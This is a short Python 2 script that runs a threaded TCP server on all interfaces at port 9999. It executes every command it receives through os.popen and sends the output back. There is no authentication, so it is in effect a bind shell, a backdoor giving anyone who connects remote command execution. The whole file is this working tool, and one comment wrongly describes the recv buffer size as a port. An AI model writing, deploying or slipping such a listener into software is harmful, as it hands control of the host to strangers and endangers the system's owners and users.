import socket
import threading 
import os
import sys

def RunCommand(command):
	output = os.popen(command)
	info = output.readlines() 
	read = ''
	for line in info: 
		line = line.strip('\r\n')
		read += line	
		read += '\r\n'
	# print read
	return read

def handle_client(client_socket):
	request = client_socket.recv(1024)     #the start port of dynamic port which operating system alllocte orderly
	print "[*] received: %s" % request
	output = RunCommand(request) 
	client_socket.send(output)
   	client_socket.close()

bind_ip = "0.0.0.0"                           #current host ip
bind_port = 9999

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_ip, bind_port))
server.listen(5)

print "[*] listening on %s:%d" %(bind_ip, bind_port)

while True:
	client,addr = server.accept()
	print "[*] Accepted connection from: %s:%d" % (addr[0],addr[1])
	client_handler = threading.Thread(target=handle_client, args = (client,))
	client_handler.start()
